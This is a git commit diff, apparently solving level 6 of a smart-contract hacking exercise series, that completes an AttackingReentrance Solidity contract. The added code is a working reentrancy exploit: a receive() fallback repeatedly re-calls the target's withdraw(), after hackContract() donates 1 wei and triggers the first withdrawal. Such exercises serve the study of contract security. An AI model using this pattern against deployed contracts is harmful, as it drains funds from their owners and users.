1b0d043f394d1079ba9185d7c201a596edcc0f0a
Poof Young <poof@coding4kicks.com>
2022-04-01 21:39:26 -0700

    Solve level 6.

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,24 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    uint256 count = 1;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
     }
 
+    receive() external payable {
+        if (count <= 5) {
+            Reentrance trance = Reentrance(contractAddress);
+            trance.withdraw();
+            count++;
+        }
+    }
+
     function hackContract() external {
         // Code me!
+        Reentrance trance = Reentrance(contractAddress);
+        trance.donate{value: 1}(address(this));
+        trance.withdraw();
     }
 }
